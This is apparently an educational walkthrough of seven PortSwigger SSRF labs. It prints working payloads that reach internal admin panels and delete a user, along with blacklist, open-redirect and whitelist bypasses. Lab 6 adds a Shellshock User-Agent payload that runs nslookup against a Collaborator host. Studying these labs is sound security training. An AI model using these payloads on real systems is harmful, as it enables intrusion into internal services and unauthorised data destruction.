# SSRF Writeup

**Author:** Ihtisham\
**Topic:** SSRF (Server-Side Request Forgery)\
**Platform:** PortSwigger Web Security Academy\
**Tools:** Burp Suite Professional, Web Browser

***

## Table of Contents

1. [Lab 1 — Basic SSRF against the local server](ssrf-writeup.md#lab-1--basic-ssrf-against-the-local-server)
2. [Lab 2 — Basic SSRF against another back-end system](ssrf-writeup.md#lab-2--basic-ssrf-against-another-back-end-system)
3. [Lab 3 — Blind SSRF with out-of-band detection](ssrf-writeup.md#lab-3--blind-ssrf-with-out-of-band-detection)
4. [Lab 4 — SSRF with blacklist-based input filter](ssrf-writeup.md#lab-4--ssrf-with-blacklist-based-input-filter)
5. [Lab 5 — SSRF with filter bypass via open redirection](ssrf-writeup.md#lab-5--ssrf-with-filter-bypass-via-open-redirection)
6. [Lab 6 — Blind SSRF with Shellshock exploitation](ssrf-writeup.md#lab-6--blind-ssrf-with-shellshock-exploitation)
7. [Lab 7 — SSRF with whitelist-based input filter](ssrf-writeup.md#lab-7--ssrf-with-whitelist-based-input-filter)

***

## Before You Start

### What is SSRF?

Server-Side Request Forgery (SSRF) happens when a web application lets an attacker force the server to make HTTP requests to an arbitrary domain of the attacker's choosing.

Usually, the attacker makes the server connect back to itself (localhost), to other internal services behind the firewall, or to external third-party systems. This can allow the attacker to access internal admin panels, read sensitive data, or perform actions they shouldn't be allowed to do.

***

## Lab 1 — Basic SSRF against the local server

**Goal:** Change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

### Steps

**Step 1:** The application has a "Check stock" feature. Click it and intercept the request in Burp Suite. You'll see an API endpoint that takes a `stockApi` URL parameter.

![Intercepting stock check request](<../../.gitbook/assets/Unknown image (143)>)

**Step 2:** Change the `stockApi` parameter to point to the local admin panel:

```
stockApi=http://localhost/admin
```

Send the request. The server fetches the admin panel page and shows it to us!

**Step 3:** To delete Carlos, we just append the deletion path to the URL:

```
stockApi=http://localhost/admin/delete?username=carlos
```

![Successfully deleting Carlos](<../../.gitbook/assets/Unknown image (144)>)

The server executes the request, deleting Carlos and solving the lab.

![Lab solved confirmation](<../../.gitbook/assets/Unknown image (145)>)

***

## Lab 2 — Basic SSRF against another back-end system

**Goal:** Access an internal admin interface at `http://192.168.0.X:8080/admin` and delete Carlos.

### Steps

**Step 1:** Intercept the "Check stock" request. We know there's an internal admin panel somewhere on the `192.168.0.X` subnet on port `8080`.

**Step 2:** Send the request to Burp Intruder. We will brute-force the IP address to find the exact machine hosting the admin panel.

```
stockApi=http://192.168.0.§1§:8080/admin
```

![Intruder configuration for brute-forcing IP](<../../.gitbook/assets/Unknown image (146)>)

**Step 3:** Set the payload to numbers from 1 to 255. Start the attack. Look for a response that returns a `200 OK` instead of a timeout or error.

![Intruder results showing 200 OK](<../../.gitbook/assets/Unknown image (147)>)

**Step 4:** Once you find the correct IP (e.g., `192.168.0.51`), modify the request in Repeater to delete Carlos using that specific IP:

```
stockApi=http://192.168.0.51:8080/admin/delete?username=carlos
```

![Sending delete request to correct internal IP](<../../.gitbook/assets/Unknown image (148)>)

The lab is solved.

![Lab solved confirmation](<../../.gitbook/assets/Unknown image (149)>)

***

## Lab 3 — Blind SSRF with out-of-band detection

**Goal:** Cause an HTTP request to the public Burp Collaborator server to prove blind SSRF exists.

### Steps

**Step 1:** In this lab, we use Burp Collaborator to get a unique domain name. If the target server makes a request to this domain, we know it's vulnerable.

**Step 2:** The application tracks analytics using the `Referer` header. Capture a request to any product page.

![Modifying the Referer header](<../../.gitbook/assets/Unknown image (150)>)

**Step 3:** Change the `Referer` header to point to your Burp Collaborator domain:

```
Referer: http://YOUR-COLLABORATOR-DOMAIN.com
```

Send the request.

![Sending the modified request](<../../.gitbook/assets/Unknown image (151)>)

**Step 4:** Check your Collaborator tab. You will see an HTTP request and DNS lookup from the target server! The lab is solved.

![Collaborator showing successful out-of-band interaction](<../../.gitbook/assets/Unknown image (152)>)

***

## Lab 4 — SSRF with blacklist-based input filter

**Goal:** Access `http://localhost/admin` and delete Carlos, bypassing the blacklist filters.

### Steps

**Step 1:** Intercept the stock check request. If you try `http://localhost/admin` or `http://127.0.0.1/admin`, the server blocks it.

**Step 2:** We can bypass the `127.0.0.1` blocklist by using an alternative representation of localhost: `127.1`. If you try `http://127.1/admin`, it still fails because `admin` is also blocked.

**Step 3:** We can bypass the `admin` block by URL-encoding it twice.

* `a` becomes `%61`
* `%61` becomes `%2561`

Our payload becomes:

```
stockApi=http://127.1/%2561dmin
```

![Double URL encoding payload](<../../.gitbook/assets/Unknown image (153)>)

**Step 4:** Send the request to access the admin panel. To delete Carlos, append the delete path (making sure to keep the double URL encoding for the "a" in admin):

```
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

![Successfully deleting Carlos using bypass](<../../.gitbook/assets/Unknown image (154)>)

The lab is solved.

![Lab solved confirmation](<../../.gitbook/assets/Unknown image (155)>)

***

## Lab 5 — SSRF with filter bypass via open redirection

**Goal:** Delete Carlos on the internal admin panel `http://192.168.0.12:8080/admin` by exploiting an open redirect.

### Steps

**Step 1:** The `stockApi` parameter is strictly validated and won't let us put external URLs. However, the site has an "open redirect" vulnerability on the "Next Product" link:

```
/product/nextProduct?path=/product?productId=2
```

**Step 2:** Intercept a stock check request. Instead of putting our target URL directly in `stockApi`, we put the _open redirect URL_ in it, and make the open redirect point to our target!

```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

![Using open redirect inside SSRF](<../../.gitbook/assets/Unknown image (156)>)

The server allows this because the URL starts with `/product/nextProduct` (which is valid locally). When it fetches it, the server gets redirected to the internal admin panel!

**Step 3:** Now change the path to delete Carlos:

```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

![Deleting Carlos via open redirect SSRF](<../../.gitbook/assets/Unknown image (157)>)

The lab is solved.

![Lab solved confirmation](<../../.gitbook/assets/Unknown image (158)>)

***

## Lab 6 — Blind SSRF with Shellshock exploitation

**Goal:** Use a blind SSRF to exploit a Shellshock vulnerability on an internal server `192.168.0.X:8080`.

### Steps

**Step 1:** If we use the Burp Collaborator Everywhere extension, we can discover that the `Referer` and `User-Agent` headers are vulnerable to blind SSRF.

![Discovering blind SSRF in headers](<../../.gitbook/assets/Unknown image (159)>)

**Step 2:** We will use the `Referer` header to trigger the SSRF against the internal network, and use the `User-Agent` header to deliver the Shellshock payload.

Change the `User-Agent` to a Shellshock payload that forces an OS command to ping our Burp Collaborator domain:

```
User-Agent: () { :; }; /usr/bin/nslookup YOUR-COLLABORATOR-DOMAIN
```

![Setting up Shellshock in User-Agent](<../../.gitbook/assets/Unknown image (160)>)

**Step 3:** We don't know the exact internal IP. Send the request to Intruder. Put the internal subnet in the `Referer` header and set the payload marker on the last octet:

```
Referer: http://192.168.0.§1§:8080/
```

Start the Intruder attack from 1 to 255.

![Intruder attack running against subnet](<../../.gitbook/assets/Unknown image (161)>)

**Step 4:** When Intruder hits the correct IP, that internal server will receive the request, process the malicious `User-Agent` via Shellshock, and execute the `nslookup` command! You will see a DNS interaction in your Collaborator tab. The lab is solved.

***

## Lab 7 — SSRF with whitelist-based input filter

**Goal:** Bypass a whitelist filter to access `http://localhost/admin` and delete Carlos.

### Steps

**Step 1:** The `stockApi` parameter only allows URLs that contain `stock.weliketoshop.net`.

![Intercepting whitelist request](<../../.gitbook/assets/Unknown image (162)>)

**Step 2:** In URLs, you can embed credentials before the hostname using `@`. We can exploit this parsing behavior. If we put `http://localhost@stock.weliketoshop.net`, the browser thinks `localhost` is a username.

However, if we add a `#` fragment identifier: `http://localhost#@stock.weliketoshop.net`, some backend parsers might treat everything after `#` as a fragment (ignoring the required whitelist), while other validation parsers might still see the required hostname!

**Step 3:** The server blocks `#`. We bypass this by double-URL-encoding it as `%2523`. Our payload becomes:

```
stockApi=http://localhost%2523@stock.weliketoshop.net/admin
```

![Bypassing whitelist using double URL encoded #](<../../.gitbook/assets/Unknown image (163)>)

The validation accepts it because it sees `@stock.weliketoshop.net`. The HTTP client connects to `localhost` because it treats the rest as a fragment!

**Step 4:** Add the path to delete Carlos:

```
stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

![Deleting Carlos with bypass](<../../.gitbook/assets/Unknown image (164)>)

The lab is solved.

***

## How to Prevent SSRF

1. **Use Whitelists (Strictly):** Only allow specific domains or IP addresses. Do not rely on regex or loose string matching.
2. **Disable Unused URL Schemes:** Disable `file://`, `ftp://`, `gopher://`, etc., in the HTTP client library if only `http/https` is needed.
3. **Network Level Defenses:** Block internal subnets (`127.0.0.0/8`, `192.168.0.0/16`, `10.0.0.0/8`) at the application or firewall level.
4. **Don't Send Raw Responses:** Don't pass the raw HTTP response from the backend service directly back to the client.

***

> **Disclaimer:** This writeup is for educational purposes only. All labs were done on PortSwigger's intentionally vulnerable platform. Don't try this on real systems without permission.
